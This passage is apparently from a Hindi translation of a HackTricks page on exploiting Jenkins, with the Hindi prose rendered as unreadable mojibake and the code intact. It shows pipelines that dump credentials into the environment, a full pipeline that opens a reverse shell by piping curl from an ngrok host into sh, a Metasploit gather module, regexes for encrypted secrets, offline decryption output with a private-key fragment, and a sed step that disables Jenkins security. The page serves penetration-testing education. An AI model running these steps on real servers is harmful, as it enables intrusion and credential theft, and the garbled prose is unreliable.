рдХрдВрдкрдирд┐рдпреЛрдВ рдХреЛ рдкреВрд░реА рддрд░рд╣ рд╕реЗ рд╕рдордЭреМрддрд╛ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**ред
{% endhint %}

### рдкрд╛рдЗрдкрд▓рд╛рдЗрди RCE

рдкрд┐рдЫрд▓реЗ RCE рдЕрдиреБрднрд╛рдЧ рдореЗрдВ рдкрд╣рд▓реЗ рд╣реА рдПрдХ рддрдХрдиреАрдХ рдХрд╛ рд╕рдВрдХреЗрдд рджрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛ [**рдкрд╛рдЗрдкрд▓рд╛рдЗрди рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдХреЗ RCE рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП**](./#rce-creating-modifying-pipeline)ред

### Env рд╡реЗрд░рд┐рдПрдмрд▓реНрд╕ рдХреА рдЬрд╛рдВрдЪ рдХрд░рдирд╛

рдкреВрд░реА рдкрд╛рдЗрдкрд▓рд╛рдЗрди рдпрд╛ рд╡рд┐рд╢рд┐рд╖реНрдЯ рдЪрд░рдгреЛрдВ рдХреЗ рд▓рд┐рдП **рд╕реНрдкрд╖реНрдЯ рдкрд╛рда env рд╡реЗрд░рд┐рдПрдмрд▓реНрд╕** рдШреЛрд╖рд┐рдд рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реИред рдЗрди env рд╡реЗрд░рд┐рдПрдмрд▓реНрд╕ рдореЗрдВ **рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдЬрд╛рдирдХрд╛рд░реА рдирд╣реАрдВ рд╣реЛрдиреА рдЪрд╛рд╣рд┐рдП**, рд▓реЗрдХрд┐рди рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рд╣рдореЗрд╢рд╛ **рд╕рднреА рдкрд╛рдЗрдкрд▓рд╛рдЗрди** рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди/Jenkinsfiles рдХреА рдЬрд╛рдВрдЪ рдХрд░ рд╕рдХрддрд╛ рд╣реИ:
```bash
pipeline {
agent {label 'built-in'}
environment {
GENERIC_ENV_VAR = "Test pipeline ENV variables."
}

stages {
stage("Build") {
environment {
STAGE_ENV_VAR = "Test stage ENV variables."
}
steps {
```
### рд╕реАрдХреНрд░реЗрдЯреНрд╕ рдбрдВрдк рдХрд░рдирд╛

Jenkins рджреНрд╡рд╛рд░рд╛ рд╕реАрдХреНрд░реЗрдЯреНрд╕ рдХреЛ рдЖрдорддреМрд░ рдкрд░ рдХреИрд╕реЗ рдЯреНрд░реАрдЯ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЗрд╕ рдмрд╛рд░реЗ рдореЗрдВ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП рдмреБрдирд┐рдпрд╛рджреА рдЬрд╛рдирдХрд╛рд░реА рджреЗрдЦреЗрдВ:

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдХреЛ **рд╡реИрд╢реНрд╡рд┐рдХ рдкреНрд░рджрд╛рддрд╛рдУрдВ** (`/credentials/`) рдпрд╛ **рд╡рд┐рд╢рд┐рд╖реНрдЯ рдкрд░рд┐рдпреЛрдЬрдирд╛рдУрдВ** (`/job/<project-name>/configure`) рдХреЗ рд▓рд┐рдП **рд╕реНрдХреЛрдк** рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдЗрд╕рд▓рд┐рдП, рд╕рднреА рдХреЛ рдПрдХреНрд╕рдлрд┐рд▓реНрдЯреНрд░реЗрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдкрдХреЛ **рдХрдо рд╕реЗ рдХрдо рдЙрди рд╕рднреА рдкрд░рд┐рдпреЛрдЬрдирд╛рдУрдВ рд╕реЗ рд╕рдордЭреМрддрд╛ рдХрд░рдирд╛ рд╣реЛрдЧрд╛** рдЬрд┐рдирдореЗрдВ рд╕реАрдХреНрд░реЗрдЯреНрд╕ рд╣реЛрддреЗ рд╣реИрдВ рдФрд░ рдХрд╕реНрдЯрдо/рдЬрд╣рд░реАрд▓реА рдкрд╛рдЗрдкрд▓рд╛рдЗрдиреЛрдВ рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдирд╛ рд╣реЛрдЧрд╛ред

рдПрдХ рдФрд░ рд╕рдорд╕реНрдпрд╛ рд╣реИ, рдкрд╛рдЗрдкрд▓рд╛рдЗрди рдХреЗ **env рдХреЗ рдЕрдВрджрд░ рдПрдХ рд╕реАрдХреНрд░реЗрдЯ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП** рдЖрдкрдХреЛ **рд╕реАрдХреНрд░реЗрдЯ рдХрд╛ рдирд╛рдо рдФрд░ рдкреНрд░рдХрд╛рд░ рдЬрд╛рдирдирд╛ рд╣реЛрдЧрд╛**ред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдпрджрд┐ рдЖрдк рдПрдХ **`usernamePassword`** **рд╕реАрдХреНрд░реЗрдЯ** рдХреЛ **`string`** **рд╕реАрдХреНрд░реЗрдЯ** рдХреЗ рд░реВрдк рдореЗрдВ **рд▓реЛрдб** рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░рддреЗ рд╣реИрдВ, рддреЛ рдЖрдкрдХреЛ рдпрд╣ **рддреНрд░реБрдЯрд┐** рдорд┐рд▓реЗрдЧреА:
```
ERROR: Credentials 'flag2' is of type 'Username with password' where 'org.jenkinsci.plugins.plaincredentials.StringCredentials' was expected
```
рдпрд╣рд╛рдБ рдХреБрдЫ рд╕рд╛рдорд╛рдиреНрдп рдЧреБрдкреНрдд рдкреНрд░рдХрд╛рд░реЛрдВ рдХреЛ рд▓реЛрдб рдХрд░рдиреЗ рдХрд╛ рддрд░реАрдХрд╛ рд╣реИ:
```bash
withCredentials([usernamePassword(credentialsId: 'flag2', usernameVariable: 'USERNAME', passwordVariable: 'PASS')]) {
sh '''
env #Search for USERNAME and PASS
'''
}

withCredentials([string(credentialsId: 'flag1', variable: 'SECRET')]) {
sh '''
env #Search for SECRET
'''
}

withCredentials([usernameColonPassword(credentialsId: 'mylogin', variable: 'USERPASS')]) {
sh '''
env # Search for USERPASS
'''
}

# You can also load multiple env variables at once
withCredentials([usernamePassword(credentialsId: 'amazon', usernameVariable: 'USERNAME', passwordVariable: 'PASSWORD'),
string(credentialsId: 'slack-url',variable: 'SLACK_URL'),]) {
sh '''
env
'''
}
```
рдЗрд╕ рдкреЗрдЬ рдХреЗ рдЕрдВрдд рдореЗрдВ рдЖрдк **рд╕рднреА рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓ рдкреНрд░рдХрд╛рд░** рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВ: [https://www.jenkins.io/doc/pipeline/steps/credentials-binding/](https://www.jenkins.io/doc/pipeline/steps/credentials-binding/)

{% hint style="warning" %}
рд╕рднреА рд╕реАрдХреНрд░реЗрдЯреНрд╕ рдХреЛ рдПрдХ рдмрд╛рд░ рдореЗрдВ **рдбрдВрдк рдХрд░рдиреЗ рдХрд╛ рд╕рдмрд╕реЗ рдЕрдЪреНрдЫрд╛ рддрд░реАрдХрд╛** рд╣реИ **Jenkins** рдорд╢реАрди рдХреЛ **рдХрдВрдкреНрд░реЛрдорд╛рдЗрдЬ** рдХрд░рдирд╛ (рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП **рдмрд┐рд▓реНрдЯ-рдЗрди рдиреЛрдб** рдореЗрдВ рдПрдХ рд░рд┐рд╡рд░реНрд╕ рд╢реЗрд▓ рдЪрд▓рд╛рдирд╛) рдФрд░ рдлрд┐рд░ **рдорд╛рд╕реНрдЯрд░ рдХреАрдЬ** рдФрд░ **рдПрдиреНрдХреНрд░рд┐рдкреНрдЯреЗрдб рд╕реАрдХреНрд░реЗрдЯреНрд╕** рдХреЛ **рд▓реАрдХ** рдХрд░рдирд╛ рдФрд░ рдЙрдиреНрд╣реЗрдВ рдСрдлрд▓рд╛рдЗрди рдбрд┐рдХреНрд░рд┐рдкреНрдЯ рдХрд░рдирд╛ред\
рдЗрд╕ рдкрд░ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА [Nodes & Agents рд╕реЗрдХреНрд╢рди](./#nodes-and-agents) рдФрд░ [Post Exploitation рд╕реЗрдХреНрд╢рди](./#post-exploitation) рдореЗрдВред
{% endhint %}

### рдЯреНрд░рд┐рдЧрд░реНрд╕

[рдбреЙрдХреНрд╕](https://www.jenkins.io/doc/book/pipeline/syntax/#triggers) рд╕реЗ: `triggers` рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ **рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рддрд░реАрдХреЛрдВ рдХреЛ рдкрд░рд┐рднрд╛рд╖рд┐рдд рдХрд░рддреА рд╣реИ рдЬрд┐рдирдореЗрдВ рдкрд╛рдЗрдкрд▓рд╛рдЗрди рдХреЛ рдкреБрдирдГ рдЯреНрд░рд┐рдЧрд░ рдХрд┐рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдП**ред рдЙрди рдкрд╛рдЗрдкрд▓рд╛рдЗрдиреЛрдВ рдХреЗ рд▓рд┐рдП рдЬреЛ GitHub рдпрд╛ BitBucket рдЬреИрд╕реЗ рд╕реНрд░реЛрддреЛрдВ рдХреЗ рд╕рд╛рде рдПрдХреАрдХреГрдд рд╣реИрдВ, `triggers` рдЖрд╡рд╢реНрдпрдХ рдирд╣реАрдВ рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВ рдХреНрдпреЛрдВрдХрд┐ рд╡реЗрдмрд╣реБрдХ-рдЖрдзрд╛рд░рд┐рдд рдПрдХреАрдХрд░рдг рдкрд╣рд▓реЗ рд╕реЗ рд╣реА рдореМрдЬреВрдж рд╣реЛ рд╕рдХрддрд╛ рд╣реИред рд╡рд░реНрддрдорд╛рди рдореЗрдВ рдЙрдкрд▓рдмреНрдз рдЯреНрд░рд┐рдЧрд░реНрд╕ `cron`, `pollSCM` рдФрд░ `upstream` рд╣реИрдВред

Cron рдЙрджрд╛рд╣рд░рдг:
```bash
triggers { cron('H */4 * * 1-5') }
```
**рджрд╕реНрддрд╛рд╡реЗрдЬрд╝реЛрдВ рдореЗрдВ рдЕрдиреНрдп рдЙрджрд╛рд╣рд░рдг рджреЗрдЦреЗрдВ**ред

### Nodes & Agents

рдПрдХ **Jenkins instance** рдореЗрдВ **рд╡рд┐рднрд┐рдиреНрди рдорд╢реАрдиреЛрдВ рдореЗрдВ рд╡рд┐рднрд┐рдиреНрди рдПрдЬреЗрдВрдЯреНрд╕ рдЪрд▓ рд░рд╣реЗ рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВ**ред рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдХреЗ рджреГрд╖реНрдЯрд┐рдХреЛрдг рд╕реЗ, рд╡рд┐рднрд┐рдиреНрди рдорд╢реАрдиреЛрдВ рддрдХ рдкрд╣реБрдВрдЪ рдХрд╛ рдорддрд▓рдм рд╣реИ **рд╡рд┐рднрд┐рдиреНрди рд╕рдВрднрд╛рд╡рд┐рдд cloud credentials** рдЪреБрд░рд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдпрд╛ **рд╡рд┐рднрд┐рдиреНрди рдиреЗрдЯрд╡рд░реНрдХ рдПрдХреНрд╕реЗрд╕** рдЬреЛ рдЕрдиреНрдп рдорд╢реАрдиреЛрдВ рдХрд╛ рд╢реЛрд╖рдг рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рджреБрд░реБрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП рдмреБрдирд┐рдпрд╛рджреА рдЬрд╛рдирдХрд╛рд░реА рджреЗрдЦреЗрдВ:

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

рдЖрдк `/computer/` рдореЗрдВ **configured nodes** рдХреЛ рд╕реВрдЪреАрдмрджреНрдз рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдЖрдорддреМрд░ рдкрд░ рдЖрдк \*\*`Built-In Node` \*\* (рдЬреЛ Jenkins рдЪрд▓рд╛ рд░рд╣рд╛ рд╣реИ) рдФрд░ рд╕рдВрднрд╛рд╡рд┐рдд рд░реВрдк рд╕реЗ рдЕрдзрд┐рдХ рдкрд╛рдПрдВрдЧреЗ:

![](<../../.gitbook/assets/image (249).png>)

**Built-In node рдХреЛ рд╕рдордЭреМрддрд╛ рдХрд░рдирд╛ рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ рджрд┐рд▓рдЪрд╕реНрдк рд╣реИ** рдХреНрдпреЛрдВрдХрд┐ рдЗрд╕рдореЗрдВ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ Jenkins рдЬрд╛рдирдХрд╛рд░реА рд╣реЛрддреА рд╣реИред

рдпрд╣ рд╕рдВрдХреЗрдд рджреЗрдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐ рдЖрдк **pipeline** рдХреЛ **built-in Jenkins node** рдореЗрдВ **рдЪрд▓рд╛рдирд╛** рдЪрд╛рд╣рддреЗ рд╣реИрдВ, рдЖрдк pipeline рдХреЗ рдЕрдВрджрд░ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
pipeline {
agent {label 'built-in'}
```
### рдкреВрд░рд╛ рдЙрджрд╛рд╣рд░рдг

рдПрдХ рд╡рд┐рд╢рд┐рд╖реНрдЯ рдПрдЬреЗрдВрдЯ рдореЗрдВ рдкрд╛рдЗрдкрд▓рд╛рдЗрди, рдПрдХ рдХреНрд░реЛрди рдЯреНрд░рд┐рдЧрд░ рдХреЗ рд╕рд╛рде, рдкрд╛рдЗрдкрд▓рд╛рдЗрди рдФрд░ рд╕реНрдЯреЗрдЬ рдПрдирд╡рд╛рдпрд░рдирдореЗрдВрдЯ рд╡реЗрд░рд┐рдПрдмрд▓реНрд╕ рдХреЗ рд╕рд╛рде, рдПрдХ рд╕реНрдЯреЗрдк рдореЗрдВ 2 рд╡реЗрд░рд┐рдПрдмрд▓реНрд╕ рд▓реЛрдб рдХрд░рдирд╛ рдФрд░ рдПрдХ рд░рд┐рд╡рд░реНрд╕ рд╢реЗрд▓ рднреЗрдЬрдирд╛:
```bash
pipeline {
agent {label 'built-in'}
triggers { cron('H */4 * * 1-5') }
environment {
GENERIC_ENV_VAR = "Test pipeline ENV variables."
}

stages {
stage("Build") {
environment {
STAGE_ENV_VAR = "Test stage ENV variables."
}
steps {
withCredentials([usernamePassword(credentialsId: 'amazon', usernameVariable: 'USERNAME', passwordVariable: 'PASSWORD'),
string(credentialsId: 'slack-url',variable: 'SLACK_URL'),]) {
sh '''
curl https://reverse-shell.sh/0.tcp.ngrok.io:16287 | sh PASS
'''
}
}
}

post {
always {
cleanWs()
}
}
}
```
## рдкреЛрд╕реНрдЯ рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯреЗрд╢рди

### Metasploit
```
msf> post/multi/gather/jenkins_gather
```
### Jenkins Secrets

рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ рдкрд░реНрдпрд╛рдкреНрдд рдЕрдиреБрдорддрд┐рдпрд╛рдБ рд╣реИрдВ, рддреЛ рдЖрдк `/credentials/` рддрдХ рдкрд╣реБрдБрдЪ рдХрд░ secrets рд╕реВрдЪреАрдмрджреНрдз рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдпрд╣ рдХреЗрд╡рд▓ `credentials.xml` рдлрд╝рд╛рдЗрд▓ рдХреЗ рдЕрдВрджрд░ рдХреЗ secrets рдХреЛ рд╕реВрдЪреАрдмрджреНрдз рдХрд░реЗрдЧрд╛, рд▓реЗрдХрд┐рди **build configuration files** рдореЗрдВ рднреА **рдЕрдзрд┐рдХ credentials** рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВред

рдпрджрд┐ рдЖрдк **рдкреНрд░рддреНрдпреЗрдХ рдкреНрд░реЛрдЬреЗрдХреНрдЯ рдХреА configuration рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ**, рддреЛ рдЖрдк рд╡рд╣рд╛рдБ **credentials (secrets) рдХреЗ рдирд╛рдо** рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ рдЬреЛ repository рддрдХ рдкрд╣реБрдБрдЪрдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛ рд░рд╣реЗ рд╣реИрдВ рдФрд░ **рдкреНрд░реЛрдЬреЗрдХреНрдЯ рдХреЗ рдЕрдиреНрдп credentials** рднреА рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВред

![](<../../.gitbook/assets/image (180).png>)

#### Groovy рд╕реЗ

{% content-ref url="jenkins-dumping-secrets-from-groovy.md" %}
[jenkins-dumping-secrets-from-groovy.md](jenkins-dumping-secrets-from-groovy.md)
{% endcontent-ref %}

#### рдбрд┐рд╕реНрдХ рд╕реЗ

рдЗрди рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ **Jenkins secrets рдХреЛ рдбрд┐рдХреНрд░рд┐рдкреНрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП**:

* secrets/master.key
* secrets/hudson.util.Secret

рдРрд╕реЗ **secrets рдЖрдорддреМрд░ рдкрд░ рдпрд╣рд╛рдБ рдкрд╛рдП рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВ**:

* credentials.xml
* jobs/.../build.xml
* jobs/.../config.xml

рдЗрдиреНрд╣реЗрдВ рдЦреЛрдЬрдиреЗ рдХреЗ рд▓рд┐рдП рдпрд╣рд╛рдБ рдПрдХ regex рд╣реИ:
```bash
# Find the secrets
grep -re "^\s*<[a-zA-Z]*>{[a-zA-Z0-9=+/]*}<"
# Print only the filenames where the secrets are located
grep -lre "^\s*<[a-zA-Z]*>{[a-zA-Z0-9=+/]*}<"

# Secret example
credentials.xml: <secret>{AQAAABAAAAAwsSbQDNcKIRQMjEMYYJeSIxi2d3MHmsfW3d1Y52KMOmZ9tLYyOzTSvNoTXdvHpx/kkEbRZS9OYoqzGsIFXtg7cw==}</secret>
```
#### Decrypt Jenkins secrets offline

рдпрджрд┐ рдЖрдкрдиреЗ **secrets рдХреЛ рдбрд┐рдХреНрд░рд┐рдкреНрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрд╡рд╢реНрдпрдХ рдкрд╛рд╕рд╡рд░реНрдб рдбрдВрдк рдХрд░ рд▓рд┐рдП рд╣реИрдВ**, рддреЛ рдЙрди secrets рдХреЛ рдбрд┐рдХреНрд░рд┐рдкреНрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП [**рдЗрд╕ рд╕реНрдХреНрд░рд┐рдкреНрдЯ**](https://github.com/gquere/pwn\_jenkins/blob/master/offline\_decryption/jenkins\_offline\_decrypt.py) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВред
```bash
python3 jenkins_offline_decrypt.py master.key hudson.util.Secret cred.xml
06165DF2-C047-4402-8CAB-1C8EC526C115
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAt985Hbb8KfIImS6dZlVG6swiotCiIlg/P7aME9PvZNUgg2Iyf2FT
```
#### Groovy рд╕реЗ Jenkins secrets рдХреЛ рдбрд┐рдХреНрд░рд┐рдкреНрдЯ рдХрд░реЗрдВ
```bash
println(hudson.util.Secret.decrypt("{...}"))
```
### рдирдпрд╛ рдПрдбрдорд┐рди рдпреВрдЬрд░ рдмрдирд╛рдПрдВ

1. Jenkins рдХреА config.xml рдлрд╛рдЗрд▓ рдХреЛ `/var/lib/jenkins/config.xml` рдпрд╛ `C:\Program Files (x86)\Jenkis\` рдореЗрдВ рдПрдХреНрд╕реЗрд╕ рдХрд░реЗрдВред
2. `<useSecurity>true</useSecurity>` рд╢рдмреНрдж рдХреЛ рдЦреЛрдЬреЗрдВ рдФрд░ \*\*`true` \*\* рдХреЛ **`false`** рдореЗрдВ рдмрджрд▓реЗрдВред
1. `sed -i -e 's/<useSecurity>true</<useSecurity>false</g' config.xml`
3. **Jenkins** рд╕рд░реНрд╡рд░ рдХреЛ **рд░реАрд╕реНрдЯрд╛рд░реНрдЯ** рдХрд░реЗрдВ: `service jenkins restart`
4. рдЕрдм рдлрд┐рд░ рд╕реЗ Jenkins рдкреЛрд░реНрдЯрд▓ рдкрд░ рдЬрд╛рдПрдВ рдФрд░ рдЗрд╕ рдмрд╛рд░ **Jenkins рдХреЛрдИ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдирд╣реАрдВ рдорд╛рдВрдЧреЗрдЧрд╛**ред рдЖрдк "**Manage Jenkins**" рдкрд░ рдЬрд╛рдХрд░ **рдПрдбрдорд┐рдирд┐рд╕реНрдЯреНрд░реЗрдЯрд░ рдкрд╛рд╕рд╡рд░реНрдб рдлрд┐рд░ рд╕реЗ рд╕реЗрдЯ** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
5. **рд╕реБрд░рдХреНрд╖рд╛** рдХреЛ рдлрд┐рд░ рд╕реЗ **рд╕рдХреНрд╖рдо** рдХрд░реЗрдВ `<useSecurity>true</useSecurity>` рд╕реЗрдЯрд┐рдВрдЧреНрд╕ рдмрджрд▓рдХрд░ рдФрд░ **Jenkins рдХреЛ рдлрд┐рд░ рд╕реЗ рд░реАрд╕реНрдЯрд╛рд░реНрдЯ** рдХрд░реЗрдВред

## рд╕рдВрджрд░реНрдн

* [https://github.com/gquere/pwn\_jenkins](https://github.com/gquere/pwn\_jenkins)
* [https://leonjza.github.io/blog/2015/05/27/jenkins-to-meterpreter---toying-with-powersploit/](https://leonjza.github.io/blog/2015/05/27/jenkins-to-meterpreter---toying-with-powersploit/)
* [https://www.pentestgeek.com/penetration-testing/hacking-jenkins-servers-with-no-password](https://www.pentestgeek.com/penetration-testing/hacking-jenkins-servers-with-no-password)
* [https://www.lazysystemadmin.com/2018/12/quick-howto-reset-jenkins-admin-password.html](https://www.lazysystemadmin.com/2018/12/quick-howto-reset-jenkins-admin-password.html)
* [https://medium.com/cider-sec/exploiting-jenkins-build-authorization-22bf72926072](https://medium.com/cider-sec/exploiting-jenkins-build-authorization-22bf72926072)
* [https://medium.com/@Proclus/tryhackme-internal-walk-through-90ec901926d3](https://medium.com/@Proclus/tryhackme-internal-walk-through-90ec901926d3)

{% hint style="success" %}
AWS Hacking рд╕реАрдЦреЗрдВ рдФрд░ рдЕрднреНрдпрд╛рд╕ рдХрд░реЗрдВ:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCP Hacking рд╕реАрдЦреЗрдВ рдФрд░ рдЕрднреНрдпрд╛рд╕ рдХрд░реЗрдВ: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks рдХреЛ рд╕рдкреЛрд░реНрдЯ рдХрд░реЗрдВ</summary>

* [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* ЁЯТм [**Discord рдЧреНрд░реБрдк**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**telegram рдЧреНрд░реБрдк**](https://t.me/peass) рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ рдпрд╛ **Twitter** ЁЯРж рдкрд░ рд╣рдореЗрдВ **рдлреЙрд▓реЛ** рдХрд░реЗрдВ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рдХреЛ рд╢реЗрдпрд░ рдХрд░реЗрдВ** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗред

</details>
{% endhint %}
